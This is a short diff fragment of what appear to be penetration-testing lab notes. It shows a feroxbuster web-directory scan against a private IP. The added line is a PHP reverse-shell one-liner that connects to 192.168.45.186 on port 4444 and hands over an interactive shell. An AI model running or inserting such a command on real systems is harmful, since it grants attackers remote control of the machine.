@@ -9,7 +9,7 @@ feroxbuster -u http://192.168.245.170/ -w /usr/share/seclists/Discovery/Web-Cont
 ```
 
 ```
-
+php -r '$sock=fsockopen("192.168.45.186",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
 ```
